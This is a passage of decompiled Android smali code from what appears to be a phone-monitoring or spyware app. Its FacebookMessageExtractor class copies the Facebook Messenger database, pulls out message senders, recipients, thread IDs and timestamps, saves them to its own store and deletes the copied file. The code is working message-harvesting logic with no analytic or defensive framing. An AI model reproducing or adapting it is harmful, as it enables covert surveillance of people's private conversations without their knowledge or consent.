    move-result-wide v10

    invoke-direct {v9, v10, v11}, Ljava/util/Date;-><init>(J)V

    iput-object v9, v7, Lcom/hp/vd/data/FacebookMessageData;->messageTime:Ljava/util/Date;

    .line 206
    invoke-virtual {v6}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v9, "sender"

    invoke-interface {v3, v9}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v9

    invoke-interface {v3, v9}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v9

    const-string v10, "user_key"

    .line 207
    invoke-virtual {v1, v9, v10}, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->scanJson(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    const-string v11, "name"

    .line 209
    invoke-virtual {v1, v9, v11}, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->scanJson(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    iput-object v9, v7, Lcom/hp/vd/data/FacebookMessageData;->sender:Ljava/lang/String;

    .line 210
    iget-object v9, v7, Lcom/hp/vd/data/FacebookMessageData;->threadId:Ljava/lang/String;

    invoke-virtual {v1, v2, v9, v10}, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->extractRecipient(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    iput-object v9, v7, Lcom/hp/vd/data/FacebookMessageData;->recipient:Ljava/lang/String;

    .line 216
    iget-object v9, v1, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->facebookMessageDao:Lcom/j256/ormlite/dao/Dao;

    invoke-interface {v9, v7}, Lcom/j256/ormlite/dao/Dao;->create(Ljava/lang/Object;)I

    move-object v7, v8

    goto :goto_1

    :cond_9
    move-object v7, v4

    .line 222
    :cond_a
    invoke-interface {v3}, Landroid/database/Cursor;->close()V

    .line 223
    invoke-virtual {v2}, Landroid/database/sqlite/SQLiteDatabase;->close()V

    .line 224
    invoke-virtual {v5}, Ljava/io/File;->delete()Z

    .line 230
    iget-object v2, v1, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "max_time"

    invoke-virtual {v7}, Ljava/lang/Long;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v3, v5}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    .line 232
    iget-object v2, v1, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v2

    invoke-virtual {v2}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getModuleDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object v2

    .line 233
    iget-object v3, v1, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-interface {v2, v3}, Lcom/j256/ormlite/dao/Dao;->update(Ljava/lang/Object;)I
    :try_end_2
    .catch Ljava/lang/Throwable; {:try_start_2 .. :try_end_2} :catch_1

    .line 243
    iget-object v2, v1, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v3, "FbMsgExtractor"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "FB-MSG successfully extracted. "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v4, " to: "

    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-interface {v2, v3, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return-void

    :catch_1
    move-exception v0

    move-object v2, v0

    .line 236
    iget-object v3, v1, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v5, "FbMsgExtractor"

    const-string v6, "Error extracting data."

    invoke-interface {v3, v5, v6, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 238
    iget-object v2, v1, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "max_time"

    invoke-virtual {v4}, Ljava/lang/Long;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v3, v4}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    return-void

    :catch_2
    move-exception v0

    move-object v2, v0

    move-object v5, v4

    .line 142
    :goto_2
    iget-object v3, v1, Lcom/hp/vd/module/monitor/facebook/UpTo81168274/FacebookMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v4, "FbMsgExtractor"

    const-string v6, "Exception caught during preparing the database for extraction."

    invoke-interface {v3, v4, v6, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    if-eqz v5, :cond_b

    .line 145
    invoke-virtual {v5}, Ljava/io/File;->delete()Z

    :cond_b
    return-void
.end method

.method protected scanJson(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 2

    .line 248
    new-instance v0, Ljava/lang/String;

    invoke-direct {v0}, Ljava/lang/String;-><init>()V

    .line 251
    :try_start_0
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1, p1}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, p2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    .line 254
    invoke-virtual {p1}, Lorg/json/JSONException;->printStackTrace()V

    move-object p1, v0

    :goto_0
    return-object p1
.end method
